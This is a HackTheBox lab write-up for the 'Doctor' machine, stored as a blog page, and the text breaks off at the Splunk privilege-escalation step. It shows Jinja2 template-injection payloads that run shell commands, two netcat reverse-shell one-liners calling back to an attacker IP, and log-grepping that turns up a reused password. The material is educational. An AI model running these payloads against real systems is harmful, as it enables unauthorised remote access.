@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Doctor - HackTheBox Write-up :: The Red Bay</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Intro Greetings, here is my write-up for the doctor HackTheBox machine. I hope you enjoy the read! If you&amp;rsquo;re in a hurry, skip to the TL;DR section at the end.
+Doctor is considered an easy Linux box by HackTheBox standards. It&amp;rsquo;s a well rounded box because its solution is composed of a mix of basic enumeration, basic priviledge escalation and also some recent CVE exploitation that can be accomplished with off-the-shelf tools." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/infosec/htb/htb-doctor/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/red.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="redbay" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Doctor - HackTheBox Write-up">
+<meta property="og:description" content="Write-up for the &#39;Doctor&#39; box from HackTheBox.eu" />
+<meta property="og:url" content="/infosec/htb/htb-doctor/" />
+<meta property="og:site_name" content="The Red Bay" />
+
+  
+    <meta property="og:image" content="/img/favicon/red.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-11-23 00:25:37 -0500 EST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    The Red Bay
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Menu ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/about">About</a></li>
+              
+            
+              
+                <li><a href="http://github.com/rebay1982">GitHub</a></li>
+              
+            
+              
+                <li><a href="/infosec">Infosec</a></li>
+              
+            
+              
+                <li><a href="/misc">Misc</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="http://github.com/rebay1982">GitHub</a></li>
+      
+    
+      
+        <li><a href="/infosec">Infosec</a></li>
+      
+    
+      
+        <li><a href="/misc">Misc</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/infosec/htb/htb-doctor/">Doctor - HackTheBox Write-up</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-11-23 
+      </span>
+    
+    
+    <span class="post-author">:: redbay</span>
+    
+  </div>
+
+  
+
+  
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-recon">Initial Recon</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#tldr">TL;DR</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <h1 id="intro">Intro<a href="#intro" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Greetings, here is my write-up for the <code>doctor</code> HackTheBox machine. I hope you enjoy the read! If
+you&rsquo;re in a hurry, skip to the <a href="#tldr">TL;DR</a> section at the end.</p>
+<p><img src="/img/htb-doctor/infocard.png" alt=""></p>
+<p>Doctor is considered an easy Linux box by HackTheBox standards. It&rsquo;s a well rounded box because
+its solution is composed of a mix of basic enumeration, basic priviledge escalation and also some
+recent CVE exploitation that can be accomplished with off-the-shelf tools. As we will see, the
+hardest part in breaking <code>doctor</code> is finding <strong>where</strong> to exploit it and getting a foot hold on it.
+A real head scratcher that reminds us that the solution is always right under our nose.  We&rsquo;re
+either overthinking it or simply not seeing it.</p>
+<p>After solving <code>doctor</code>, we won&rsquo;t be able to help but notice the amount of clues the information card
+picture actually gives out! Alright, enough talking, let&rsquo;s get to work.</p>
+<h2 id="initial-recon">Initial Recon<a href="#initial-recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>First and foremost, as with any target we engage, we need to start by doing some basic enumeration
+and reconnaissance work because we can&rsquo;t engage a box without knowing what&rsquo;s running on it.  This
+basically means we need to run a port scan to get that information and this is accomplished by using
+<code>nmap</code> with the <code>-sV</code>.  The <code>-sV</code> flag simply tells <code>nmap</code> to probe the open ports to gather the
+service and version information.</p>
+<p>Let&rsquo;s see what we got.</p>
+<pre><code>$ nmap -sV 10.10.10.209
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 21:31 EDT
+Nmap scan report for 10.10.10.209
+Host is up (0.027s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
+8089/tcp open  ssl/http Splunkd httpd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.84 seconds
+</code></pre><p>There are a few things of interest here. First, the machine serves up some SSH (version OpenSSH
+8.2p1) &ndash; we might need this to log into it. Second, it serves HTTP using Apache 2.4.41. This
+indicates that it&rsquo;s running a web site of some sort. Last but not least, it&rsquo;s running Splunk &ndash;
+no version information is available yet so it might be something to check out later.</p>
+<p>Wild guess is that Splunk will be our main attack vector to obtain root, but we&rsquo;ll just have to wait
+and see. This reasoning comes from the fact that  this is the only service that is running besides
+the standard SSH and HTTP services. We&rsquo;re here to learn new things, aren&rsquo;t we?</p>
+<p>For completion&rsquo;s sake, let&rsquo;s do an HTTP enumeration to see if we could glean any more information.
+This enumerates directories used by popular web applications or frameworks to fingerprint them. It
+also identifies common directories that can contain interesting files hosted on the web servers.
+This is achieved by using the<br>
+<a href="https://nmap.org/nsedoc/scripts/http-enum.html"><code>--script=http-enum</code></a> flag with <code>nmap</code>.</p>
+<pre><code>$ nmap -sV --script=http-enum 10.10.10.209
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 21:43 EDT
+Nmap scan report for 10.10.10.209
+Host is up (0.031s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
+| http-server-header:
+|   Apache/2.4.41 (Ubuntu)
+|_  Werkzeug/1.0.1 Python/3.8.2
+8089/tcp open  ssl/http Splunkd httpd
+| http-enum:
+|   /robots.txt: Robots file
+|_  /services/: Potentially interesting folder (401 Unauthorized)
+|_http-server-header: Splunkd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 316.44 seconds
+</code></pre><p>Here&rsquo;s something unexpected. Looking at the results for port <code>80</code>, <code>nmap</code> found two services there.
+Apache and Werkzeug. For the unfamiliar, Werkzeug is a utility library for Python for building WSGI
+(Web Server Gateway Interface) applications. For anyone having done web development, this hints to a
+<a href="https://https://palletsprojects.com/p/flask/">Flask</a> application. This is valuable information
+that could possibly lead to our foothold.</p>
+<p>Next, on port <code>8089</code>, we have the <code>/services</code> directory from Splunk and a standard <code>robots.txt</code>. A
+<code>robots.txt</code> file  provides instructions to web crawlers on what they can or can&rsquo;t visit.  See
+<a href="https://www.robotstxt.org/robotstxt.html">here</a> for more information. As for the <code>/services</code>
+folder, pointing our web browser to <code>10.10.10.209:8089/services</code> serves up a authentication in
+prompt for which we do not have credentials yet. Let&rsquo;s take note of this and move on for now.</p>
+<h3 id="web-surfing">Web Surfing<a href="#web-surfing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>With basic enumeration done, let&rsquo;s engage the machine. Visiting the hosted static site through a
+web browser doesn&rsquo;t bring up much: a simple, static site where every page is the same.</p>
+<p><img src="/img/htb-doctor/static.png" alt=""></p>
+<p>I&rsquo;ll be honest, I spent way more time poking around than I&rsquo;d like to admit. Let&rsquo;s have a look at
+the header while requesting the static content.</p>
+<p>Using a basic <code>curl</code> command yields these results</p>
+<pre><code>$ curl -vvv http://10.10.10.209:80/
+*   Trying 10.10.10.209:80...
+* Connected to 10.10.10.209 (10.10.10.209) port 80 (#0)
+&gt; GET / HTTP/1.1
+&gt; Host: 10.10.10.209
+&gt; User-Agent: curl/7.73.0
+&gt; Accept: */*
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 200 OK
+&lt; Date: Sun, 25 Oct 2020 02:39:20 GMT
+&lt; Server: Apache/2.4.41 (Ubuntu)
+&lt; Last-Modified: Sat, 19 Sep 2020 16:59:55 GMT
+&lt; ETag: &quot;4d88-5afad8bea6589&quot;
+&lt; Accept-Ranges: bytes
+&lt; Content-Length: 19848
+&lt; Vary: Accept-Encoding
+&lt; Content-Type: text/html
+</code></pre><p>As expected, by looking at the <code>Server:</code> header, Apache is serving up the static site.  After
+spending a crazy amount of time looking through the website, looking at the source code and almost
+giving up, I noticed an email in the contact information section. The &ldquo;send us a message&rdquo; address is
+<code>info@doctors.htb</code>.</p>
+<p><img src="/img/htb-doctor/email.png" alt=""></p>
+<p>At wit&rsquo;s end, I passed <code>doctors.htb</code> as the host in my request header by using the
+<code>--header &quot;Host: doctors.htb&quot;</code> flag with curl <code>curl</code>.</p>
+<pre><code>$ curl -vvv http://10.10.10.209:80/ --header &quot;Host: doctors.htb&quot;
+*   Trying 10.10.10.209:80...
+* Connected to 10.10.10.209 (10.10.10.209) port 80 (#0)
+&gt; GET / HTTP/1.1
+&gt; Host: doctors.htb
+&gt; User-Agent: curl/7.73.0
+&gt; Accept: */*
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 302 FOUND
+&lt; Date: Sun, 25 Oct 2020 02:44:08 GMT
+&lt; Server: Werkzeug/1.0.1 Python/3.8.2
+&lt; Content-Type: text/html; charset=utf-8
+&lt; Content-Length: 237
+&lt; Location: http://doctors.htb/login?next=%2F
+&lt; Vary: Cookie
+&lt; Set-Cookie: session=&lt;some cookie&gt;; HttpOnly; Path=/
+&lt;
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+* Connection #0 to host 10.10.10.209 left intact
+&lt;p&gt;You should be redirected automatically to target URL: &lt;a href=&quot;/login?next=%2F&quot;&gt;/login?next=%2F&lt;/a&gt;.  If not click the link.
+</code></pre><p>Bingo. Werkzeug/Python served this up (Server info in the header) and is actually redirecting us
+(<code>302</code> HTTP reponse) to <code>/login?next=%2F</code>. Things like this is what what made this machine
+difficult in my opinion and pushed my curiosity a bit &ndash; there is a lot of non technical things to
+look out for.  Some information is hiding in plain sight.</p>
+<p>Alright, this is great and we&rsquo;re making progress but what actually happened here? Why would we
+even think of using <code>doctors.htb</code> in the host header? Apache (and web servers in general) can be
+configured to host multiple web sites based on domains and leverage the host header in the HTTP
+request to know which site to serve up to the client. Apache&rsquo;s has
+<a href="https://httpd.apache.org/docs/2.4/vhosts/examples.html">documentation</a> on how to set this up.</p>
+<p>Adding the following entry to the <code>/etc/hosts</code> file</p>
+<pre><code>10.10.10.209	doctors.htb
+</code></pre><p>makes it possible to use <code>doctors.htb</code> to reach the <code>doctor</code> box. For more information on the
+<code>/etc/hosts</code>, look up &ldquo;local DNS&rdquo;.</p>
+<p>By surfing to <code>http://doctors.htb</code>, we are leveraging this addition and our browser will use
+<code>doctors.htb</code> in the host header of the outgoing HTTP request. We are now presented a login screen</p>
+<p><img src="/img/htb-doctor/login.png" alt=""></p>
+<p>And there you have it, we stumbled upon a login screen to a portal where we can create an account
+and post messages &ndash; user input. Let&rsquo;s create an account and see where this leads us to.</p>
+<h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="attack-vector">Attack Vector<a href="#attack-vector" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Next on the list is finding our primary attack vector.  After creating an account on the login
+screen, we enter a forum where you can post messages with a title and a body. This is nothing
+special but it looks templated. Hopefully we can take advantage of that.</p>
+<p><img src="/img/htb-doctor/forum.png" alt=""></p>
+<p>Armed with the knowledge that this site was built in Flask and is likely templated, we can try some
+basic server side template injection (SSTI). The principle of server side template injection is to
+provide template directives as user input. You can read more about SSTI in Flask and Jinja2
+(a templating engine)
+<a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">here</a> or you can reference
+this <a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti">cheat sheet</a>.</p>
+<p>After trying to insert some templating recon, results weren&rsquo;t as expected</p>
+<p><img src="/img/htb-doctor/inject.png" alt=""></p>
+<p>Let&rsquo;s stop here for a moment and ponder why we&rsquo;re trying <code>{{ 7*7 }}</code> and what is it that we were
+expecting. As stated above, we&rsquo;re trying provide a template directive as the user input. Had it
+been successful, we would have observed <code>49</code> instead of <code>{{ 7*7 }}</code> because Python would have
+computed the multiplication and replaced it in the template when generating the page to display.
+This is not the case here. Python is just taking the input and showing it as-is.</p>
+<p>This part also took me more time than I&rsquo;d like to admit. Sometimes the clues are right under your
+nose. If we dig through the source code of the forum, you will find the following at the top of
+the body section</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse navbar-collapse&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbarToggle&#34;</span>&gt;
+	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-nav mr-auto&#34;</span>&gt;
+		&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-item nav-link&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home&#34;</span>&gt;Home&lt;/<span style="color:#f92672">a</span>&gt;
+		<span style="color:#75715e">&lt;!--archive still under beta testing&lt;a class=&#34;nav-item nav-link&#34; href=&#34;/archive&#34;&gt;Archive&lt;/a&gt;--&gt;</span>
+	&lt;/<span style="color:#f92672">div</span>&gt;
+	<span style="color:#75715e">&lt;!-- Navbar Right Side --&gt;</span>
+</code></pre></div><p>Beta testing? Sounds promising&hellip; If we try going to <code>http://doctors.htb/archive</code>, we are met with
+a blank page.  Looking at the response through our browser&rsquo;s dev tools, we see that it contains the
+titles of the messages we created in the forum earlier and that the injection recon we tried
+(<code>{{ 7*7 }}</code>) is actually computed (<code>&lt;title&gt;49&lt;/title&gt;</code>)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+<span style="color:#f92672">&lt;rss</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;2.0&#34;</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;channel&gt;</span>
+<span style="color:#f92672">&lt;title&gt;</span>Archive<span style="color:#f92672">&lt;/title&gt;</span>
+<span style="color:#f92672">&lt;item&gt;&lt;title&gt;</span>asd<span style="color:#f92672">&lt;/title&gt;&lt;/item&gt;</span>
+
+		<span style="color:#f92672">&lt;/channel&gt;</span>
+		<span style="color:#f92672">&lt;item&gt;&lt;title&gt;</span>123<span style="color:#f92672">&lt;/title&gt;&lt;/item&gt;</span>
+
+		<span style="color:#f92672">&lt;/channel&gt;</span>
+		<span style="color:#f92672">&lt;item&gt;&lt;title&gt;</span>49<span style="color:#f92672">&lt;/title&gt;&lt;/item&gt;</span>
+
+		<span style="color:#f92672">&lt;/channel&gt;</span>
+</code></pre></div><p>This computation is enough to know that the templating engine is parsing the injection as valid
+directives and executing it as Python code. It&rsquo;s time to see if we can get it to execute something
+on the command line through Python directives.  The payload would look something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami; id&#39;</span>)<span style="color:#f92672">.</span>read()}}
+</code></pre></div><p>Let&rsquo;s not go into crazy detail about this but what we&rsquo;re doing is requesting, through Python, that
+the remote machine executes the <code>whoami</code> and <code>id</code> shell commands. <code>whoami</code> informs us who the
+commands is being executed as (the user that is used to run the service on the server) and the
+<code>id</code> command gives us extra information about the said user.</p>
+<p>You can checkout the Python
+<a href="https://stackabuse.com/pythons-os-and-subprocess-popen-commands/">popen</a> documentation if you want
+to dig deeper into the popen function used to run shell commands.</p>
+<p>After adding that injection, we can browse back to the <code>/archive</code> endpoint to see the results</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+&lt;<span style="color:#f92672">rss</span> <span style="color:#a6e22e">version</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2.0&#34;</span>&gt;
+&lt;<span style="color:#f92672">channel</span>&gt;
+&lt;<span style="color:#f92672">title</span>&gt;Archive&lt;/<span style="color:#f92672">title</span>&gt;
+&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;asd&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
+
+		&lt;/<span style="color:#f92672">channel</span>&gt;
+		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;123&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
+
+		&lt;/<span style="color:#f92672">channel</span>&gt;
+		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;49&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
+
+		&lt;/<span style="color:#f92672">channel</span>&gt;
+		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt; web
+		uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
+&lt;/<span style="color:#f92672">channel</span>&gt;
+</code></pre></div><p>Here&rsquo;s the part in the response that is of interest:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">		&lt;/<span style="color:#f92672">channel</span>&gt;
+		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt; web
+		uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+</code></pre></div><p>The result is the output of our <code>whoami; id</code> command.  So now we know that we can run some shell
+commands through the templating engine and that we&rsquo;re in fact running these commands as the <code>web</code>
+user, who belongs to the <code>web</code> and <code>adm</code> groups.</p>
+<p>We&rsquo;re making good progress here and the next step is to try to acquire a
+<a href="https://hackernoon.com/reverse-shell-cf154dfee6bd">reverse shell</a>.  Following that, we can start
+the process of moving out of our low privileged user (<code>web</code> in this case).</p>
+<h3 id="reverse-shell">Reverse Shell<a href="#reverse-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Using the SSTI method outlined above, we can now try our hand at a reverse shell. Starting with <code>nc</code>
+(<a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>) and using the most common method, I couldn&rsquo;t obtain
+successful results. Here&rsquo;s what the payload would have looked like</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;nc -e /usr/bin/sh &lt;ip&gt; 4545&#39;</span>)<span style="color:#f92672">.</span>read()}}
+</code></pre></div><p>By the way, <code>&lt;ip&gt;</code> should be replaced with our machine&rsquo;s IP address on the HackTheBox.eu network.
+Then, on our machine, we would have executed the following netcat command</p>
+<pre><code>nc -lvp 4545
+</code></pre><p>As stated above, I wasn&rsquo;t able to get netcat to execute <code>/usr/bin/sh</code> so I couldn&rsquo;t get the remote
+machine to connect to mine and get the reverse shell. We&rsquo;re going to have to resort to some bash-fu
+and a little bit of sorcery. Let&rsquo;s look at this alternative</p>
+<pre><code>rm /tmp/asd;mkfifo /tmp/asd;cat /tmp/asd|/usr/bin/sh -i 2&gt;&amp;1|nc &lt;ip&gt; 4545 &gt;/tmp/asd
+</code></pre><p>This creates a kind of feedback loop that whatever is received by netcat gets written
+into the <code>/tmp/asd</code> file (<code>nc &lt;ip&gt; 4545 &gt;/tmp/asd</code>) which in turn gets piped into <code>/usr/bin/sh</code>
+(<code>cat /tmp/asd|/usr/bin/sh -i 2&gt;&amp;1</code>). The <code>2&gt;&amp;1</code> simply tells the system to redirect
+the standard error output into standard output.</p>
+<p>Alright, hold your horses, why would this work and not the previous <code>nc -e /usr/bin/sh/</code> command?
+Instead of using the <code>-e</code> netcat flag to execute a program after a connection is established, we&rsquo;re
+using netcat to pass strings back and forth between the remote host and our machine. The strings
+received are written into the <code>/tmp/asd</code> file and that is getting piped into the <code>/usr/bin/sh</code>
+command to execute whatever we just sent it.</p>
+<p>This <a href="https://www.brianstorti.com/understanding-shell-script-idiom-redirect/">post</a> is a good
+startng point if you&rsquo;re curious about the redirection and piping  mysticism in the above string of
+commands.</p>
+<p>This new revised command grants us the reverse shell we are after.</p>
+<pre><code>$ nc -lvp 4545
+Connection from 10.10.10.209:47142
+/usr/bin/sh: 0: can't access tty; job control turned off
+$ ls -la
+total 48
+drwxr-xr-x 6 web  web  4096 Sep 28 15:04 .
+drwxr-xr-x 4 root root 4096 Sep 19 16:54 ..
+lrwxrwxrwx 1 web  web     9 Jul 26 14:24 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 web  web   220 Jul 20 22:34 .bash_logout
+-rw-r--r-- 1 web  web  3771 Jul 20 22:34 .bashrc
+drwxr-xr-x 3 web  web  4096 Sep 22 11:29 blog
+-rwxrwxr-x 1 web  web   135 Jul 26 14:12 blog.sh
+drwxrwxr-x 5 web  web  4096 Jul 27 20:45 .cache
+drwxr-xr-x 4 web  web  4096 Jul 27 20:45 .config
+drwxrwxr-x 5 web  web  4096 Jul 26 12:46 .local
+-rw-r--r-- 1 web  web   807 Jul 20 22:34 .profile
+-rw------- 1 web  web   177 Jul 27 20:45 .python_history
+-rw-rw-r-- 1 web  web    66 Jul 26 12:44 .selected_editor
+$ 
+</code></pre><p>We now have obtained a shell on the machine and we can start looking around in a more convenient
+fashion compared to injecting every single command we want to execute and browsing to the <code>/archive</code>
+endpoint. We also learned that there are work arounds to not being able to execute commands using
+netcat on the remote machine. Let&rsquo;s go catch that user flag!</p>
+<h2 id="user">User<a href="#user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Now that we have a shell, let&rsquo;s go snooping around to find a way to elevate our privileges and get
+the user flag. We will be engaging in some basic recon work and some looking around. One good
+first step would be to find out who the target user is.</p>
+<pre><code>$ ls /home
+shaun
+web
+$ ls -l /home/shaun
+total 4
+-r-------- 1 shaun shaun 33 Nov  7 20:04 user.txt
+$
+</code></pre><p>Okay, <code>shaun</code> is our man. We obviously don&rsquo;t have access to the <code>user.txt</code> file in his home directory
+but that&rsquo;s the file that contains the user flag. Based on the permission scheme for it, only <code>shaun</code>
+(or <code>root</code>) can read its contents. We can carry on by using tools like
+<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a>
+or sleuthing manually through the system. These types of enumeration tool run a bunch of commands
+and they also look around the system and its log files. Enumeration tools try to identify potential
+targets for privilege escalatiom but will not do exploits for you. You will be handed a thorough
+report when the tool completes its run which will contain a large amount of possible escalation
+vectors. This can be seriously overwhelming for someone who isn&rsquo;t familar with this type of thing.
+This amount of information will have us spend more time reading the report than actually trying
+things and understanding what we&rsquo;re doing.</p>
+<p>Let&rsquo;s see what we can come up with on our own. General rule of thumb, log files can be a good
+starting point to look into and as stated previously, enumeration tools will look into system logs
+for passwords, failed authentication attemps, errors, that sort of thing.</p>
+<p>Grepping for <code>password</code> in <code>/var/log</code> brings up all the lines for every file under <code>/var/log</code> that
+matches our search criteria of <code>password</code>. Not shown here since it would take up a good amount of
+space, but the number of matches was pretty large. Spending a good amount of time looking at the
+matches payed off as the following line struck my curiosity nerve:</p>
+<pre><code>$ grep -r -i &quot;password&quot; /var/log
+...
+/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar123&quot; 500 453 &quot;http://doctor.htb/reset_password&quot;
+...
+$
+</code></pre><p>Interesting. A <code>POST</code> request to some sort of password reset endpoint on the server (it was found in
+the Apache log).  Using <code>Guitar123</code> as an email in a password reset request is pretty odd since it&rsquo;s
+obviously not an email. We can&rsquo;t consider it a password either because if someone is resetting
+their password, they essentially forgot what it was. They can&rsquo;t have mistakenly typed it in as the
+email in the request. On the other hand, we can all agree that <code>Guitar123</code> does look like a poor
+password someone might use. This is an other instance where a lot of time was spent digging for
+information and ending up trying trivial and desperate things to progress to the next point.</p>
+<p>If we try <code>su</code>-ing into <code>shaun</code>, we get asked for his password. At this point, we&rsquo;re desperate
+again so let&rsquo;s try <code>Guitar123</code>.</p>
+<pre><code>$ su shaun
+Password: Guitar123
+whoami
+shaun
+id
+uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
+</code></pre><p>Well&hellip; It worked&hellip; Let&rsquo;s stay collected and cat the <code>user.txt</code> file to obtain the user flag.</p>
+<pre><code>cat /home/shaun/user.txt
+7dfec0e6330b1ec2b10db9728217fb7e
+</code></pre><p>Well deserved. I&rsquo;ve stated this before but let&rsquo;s take some time to reflect on it again. Up until
+now, we haven&rsquo;t done any complex exploitation. We&rsquo;re using basic every-day commands and looking for
+information that is readily available on the machine we&rsquo;re trying to break. The password for our
+target user can be found in a log entry for a messed-up password reset attempt. This box teaches
+us some good lessons. Enumeration tools wouldn&rsquo;t have helped much. If you do try it, the tool will
+have pulled up the same log as we did with our <code>grep</code> command. We would still have had to go through
+the log and identify that line.</p>
+<p>Understanding what we&rsquo;re doing and what we&rsquo;re looking for has a lot more value in this case than
+trying to use tools that will do the work for us.</p>
+<h2 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Now that we have the user flag, let&rsquo;s see about root.  From the initial <a href="#enumeration">recon</a>, we
+know this box is running Splunk on port <code>8089</code>.  Let&rsquo;s go have a look by pointing our browswer
+to <code>doctors.htb:8089/</code></p>
+<p><img src="/img/htb-doctor/splunk.png" alt=""></p>
+<p>Good, we now have a version &ndash; <code>8.0.5</code>.  We&rsquo;ll do some digging later and try to find vulnerabilities
+related to it. We can start by looking around and trying things. <code>services</code> brings up a login
+prompt. Same thing for <code>servicesNS</code>. <code>rpc</code>, which stands for <code>remote procedure call</code>, brings up an
+invalid request page and <code>static</code> returns a <code>404</code>.</p>
+<p>Let&rsquo;s try the obvious and read trough the documentation and try default passwords. It&rsquo;s surprising
+how often people run services on their machines and don&rsquo;t change the default configured passwords.</p>
+<p>This time though, they did change it. The only username / password pair that we have on this system
+for now is <code>shaun/Guitar123</code>. Browsing back to the <code>services</code> page and using these credentials
+actually grant us access to it. After a few minute of poking around, we&rsquo;re not finding anything of
+obvious interest. The World Wide Web can be of huge service to us in such cases so let&rsquo;s see if
+there aren&rsquo;t any known exploits for Splunk 8.0.5. I stumbled upon this great
